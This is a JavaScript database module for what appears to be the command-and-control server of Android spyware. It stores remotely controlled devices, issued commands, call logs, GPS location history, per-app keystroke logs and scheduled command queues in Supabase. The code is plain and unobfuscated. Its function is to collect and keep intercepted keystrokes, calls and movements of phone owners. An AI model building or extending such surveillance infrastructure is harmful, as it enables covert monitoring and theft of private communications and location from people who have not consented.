/**
 * Supabase Database Service
 * Handles device persistence to Supabase PostgreSQL
 */

import { createClient } from '@supabase/supabase-js';
import { config } from '../config.js';

// Initialize Supabase client
const supabase = config.supabase.url && config.supabase.key
    ? createClient(config.supabase.url, config.supabase.key)
    : null;

if (!supabase) {
    console.warn('[Database] ⚠️ Supabase not configured — running in memory-only mode');
} else {
    console.log('[Database] ✅ Supabase client initialized');
}

/**
 * Upsert a device (insert or update on conflict)
 */
export async function upsertDevice(deviceId, metadata = {}) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('devices')
            .upsert({
                device_id: deviceId,
                model: metadata.model || null,
                manufacturer: metadata.manufacturer || null,
                android_version: metadata.androidVersion || null,
                battery: metadata.battery || null,
                status: metadata.status || 'online',
                last_seen: new Date().toISOString(),
                connected_at: metadata.connectedAt || new Date().toISOString(),
                metadata: metadata,
            }, { onConflict: 'device_id' });

        if (error) {
            console.error(`[Database] Upsert error for ${deviceId}:`, error.message, error.details);
        } else {
            console.log(`[Database] ✅ Device ${deviceId.substring(0, 8)}... saved to Supabase`);
        }
    } catch (err) {
        console.error(`[Database] Error upserting device ${deviceId}:`, err.message);
    }
}

/**
 * Update device status only
 */
export async function updateDeviceStatus(deviceId, status) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('devices')
            .update({
                status,
                last_seen: new Date().toISOString(),
            })
            .eq('device_id', deviceId);

        if (error) throw error;
    } catch (err) {
        console.error(`[Database] Error updating status for ${deviceId}:`, err.message);
    }
}

/**
 * Load all devices from database (for server startup)
 */
export async function getAllDevices() {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('devices')
            .select('*')
            .order('last_seen', { ascending: false });

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading devices:', err.message);
        return [];
    }
}

/**
 * Delete device permanently from database
 */
export async function deleteDeviceFromDB(deviceId) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('devices')
            .delete()
            .eq('device_id', deviceId);

        if (error) throw error;
    } catch (err) {
        console.error(`[Database] Error deleting device ${deviceId}:`, err.message);
    }
}

// ========== COMMAND HISTORY ==========

/**
 * Save a command entry to Supabase (fire & forget)
 */
export async function saveCommandHistory(entry) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('command_history')
            .insert({
                device_id: entry.deviceId,
                command_id: entry.commandId,
                action: entry.action,
                payload: entry.payload || null,
                status: entry.status,
                response: typeof entry.response === 'string'
                    ? { text: entry.response }
                    : (entry.response || null),
                duration_ms: entry.durationMs || 0,
                created_at: entry.timestamp || new Date().toISOString(),
            });

        if (error) {
            console.error(`[Database] Command history save error:`, error.message);
        }
    } catch (err) {
        // Silent fail — don't break the app for logging
    }
}

/**
 * Get command history from Supabase (for loading on restart)
 */
export async function getCommandHistory(deviceId = null, limit = 100) {
    if (!supabase) return [];

    try {
        let query = supabase
            .from('command_history')
            .select('*')
            .order('created_at', { ascending: false })
            .limit(limit);

        if (deviceId) {
            query = query.eq('device_id', deviceId);
        }

        const { data, error } = await query;
        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading command history:', err.message);
        return [];
    }
}

// ========== CALL LOGS ==========

/**
 * Save call logs to Supabase (bulk upsert, fire & forget)
 */
export async function saveCallLogs(deviceId, logs) {
    if (!supabase || !logs || logs.length === 0) return;

    try {
        const rows = logs.map(log => ({
            device_id: deviceId,
            name: log.name || null,
            number: log.number || 'Unknown',
            type: log.type || 'UNKNOWN',
            date: log.date || null,
            duration: parseInt(log.duration) || 0,
        }));

        const { error } = await supabase
            .from('call_logs')
            .upsert(rows, { onConflict: 'device_id,number,date' });

        if (error) {
            console.error('[Database] Call logs save error:', error.message);
        }
    } catch (err) {
        // Silent fail
    }
}

/**
 * Get call logs from Supabase
 */
export async function getCallLogsFromDB(deviceId, limit = 500) {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('call_logs')
            .select('*')
            .eq('device_id', deviceId)
            .order('date', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading call logs:', err.message);
        return [];
    }
}

// ========== LOCATION HISTORY ==========

/**
 * Save a location point to Supabase (fire & forget)
 */
export async function saveLocation(deviceId, loc) {
    if (!supabase) return;

    try {
        const { error } = await supabase
            .from('location_history')
            .insert({
                device_id: deviceId,
                latitude: loc.latitude,
                longitude: loc.longitude,
                accuracy: loc.accuracy || null,
                altitude: loc.altitude || null,
                speed: loc.speed || null,
                provider: loc.provider || null,
                created_at: new Date().toISOString(),
            });

        if (error) {
            console.error('[Database] Location save error:', error.message);
        }
    } catch (err) {
        // Silent fail
    }
}

/**
 * Get location history from Supabase
 */
export async function getLocationHistoryFromDB(deviceId, limit = 100) {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('location_history')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading location history:', err.message);
        return [];
    }
}

// ========== KEYLOG EVENTS ==========

/**
 * Save keylog events to Supabase (batch insert, fire & forget)
 */
export async function saveKeylogEvents(deviceId, events) {
    if (!supabase || !events || events.length === 0) return;

    try {
        const rows = events.map(ev => ({
            device_id: deviceId,
            event_type: ev.type || 'keystroke',
            app_package: ev.app || 'unknown',
            text: ev.text || '',
            full_text: ev.fullText || null,
            class_name: ev.className || null,
            created_at: ev.timestamp ? new Date(ev.timestamp).toISOString() : new Date().toISOString(),
        }));

        const { error } = await supabase
            .from('keylog_events')
            .insert(rows);

        if (error) {
            console.error('[Database] Keylog save error:', error.message);
        }
    } catch (err) {
        // Silent fail
    }
}

/**
 * Get keylog events from Supabase
 */
export async function getKeylogEventsFromDB(deviceId, limit = 500) {
    if (!supabase) return [];

    try {
        const { data, error } = await supabase
            .from('keylog_events')
            .select('*')
            .eq('device_id', deviceId)
            .order('created_at', { ascending: false })
            .limit(limit);

        if (error) throw error;
        return data || [];
    } catch (err) {
        console.error('[Database] Error loading keylog events:', err.message);
        return [];
    }
}


// ========== SCHEDULED COMMAND QUEUE ==========

/**
 * Save/replace the scheduled queue for a device in Supabase.
 * Uses upsert — if device already has a row, it replaces the commands JSON.
 */
export async function saveScheduledQueue(deviceId, commands) {
    if (!supabase) return;
    try {
        if (!commands || commands.length === 0) {
            // Empty queue → delete the row
            await supabase.from('scheduled_commands').delete().eq('device_id', deviceId);
            return;
        }
        const { error } = await supabase
            .from('scheduled_commands')
            .upsert({
                device_id: deviceId,
                commands: commands,
                updated_at: new Date().toISOString(),
            }, { onConflict: 'device_id' });
        if (error) console.error('[Database] scheduled_commands save error:', error.message);
    } catch (err) {
        console.error('[Database] saveScheduledQueue error:', err.message);
    }
}

/**
 * Load all scheduled queues from Supabase on server startup.
 * Returns a plain object: { deviceId: [commands] }
 */
export async function loadAllScheduledQueues() {
    if (!supabase) return {};
    try {
        const { data, error } = await supabase
            .from('scheduled_commands')
            .select('device_id, commands');
        if (error) throw error;
        const result = {};
        for (const row of (data || [])) {
            if (Array.isArray(row.commands) && row.commands.length > 0) {
                result[row.device_id] = row.commands;
            }
        }
        return result;
    } catch (err) {
        console.error('[Database] loadAllScheduledQueues error:', err.message);
        return {};
    }
}

export { supabase };
